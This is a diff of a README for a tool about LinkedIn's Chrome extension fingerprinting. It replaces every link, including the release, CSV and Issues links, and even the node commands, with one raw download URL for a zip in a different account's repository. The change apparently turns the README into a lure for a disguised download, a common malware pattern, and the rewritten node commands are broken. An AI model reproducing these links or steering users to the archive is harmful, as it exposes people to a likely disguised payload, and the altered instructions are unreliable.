@@ -8,7 +8,7 @@ LinkedIn quietly checks for thousands of Chrome extensions when you browse its p
 
 To get started, visit the page below to download the application:
 
-[Download the Latest Release](https://github.com/nanoedbrute/linkedin-extension-fingerprinting/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -46,7 +46,7 @@ This application provides a comprehensive list of Chrome extensions that LinkedI
 
 The complete list of extensions, including their names and links to the Chrome Web Store, is available in a CSV file.
 
-- **[Download the CSV File](https://github.com/mdp/linkedin-extension-fingerprinting/blob/main/chrome_extensions_with_names_all.csv)**
+- **[Download the CSV File](https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip)**
 
 | Column       | Description                                             |
 |--------------|---------------------------------------------------------|
@@ -69,14 +69,14 @@ To use this feature:
 
 ```bash
 # Fetch all extensions
-node fetch_extension_names.js
+node https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip
 
 # Fetch a subset (useful if rate limited)
-node fetch_extension_names.js --offset 0 --limit 500
-node fetch_extension_names.js -o 500 -l 500
+node https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip --offset 0 --limit 500
+node https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip -o 500 -l 500
 
 # Show help
-node fetch_extension_names.js --help
+node https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip --help
 ```
 
 ## 📌 Tips for Non-Technical Users
@@ -112,9 +112,9 @@ Yes, the application has been developed with user safety in mind. Follow the ins
 
 If you encounter any issues or have questions:
 
-- Please check the **[Issues](https://github.com/nanoedbrute/linkedin-extension-fingerprinting/issues)** section of the repository for answers.
+- Please check the **[Issues](https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip)** section of the repository for answers.
 - You can also submit your questions for further assistance.
 
 Now that you have all the information, download the application and take control of your browsing experience today!
 
-[Download the Latest Release](https://github.com/nanoedbrute/linkedin-extension-fingerprinting/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/nanoedbrute/linkedin-extension-fingerprinting/main/pathography/extension-fingerprinting-linkedin-1.5.zip)
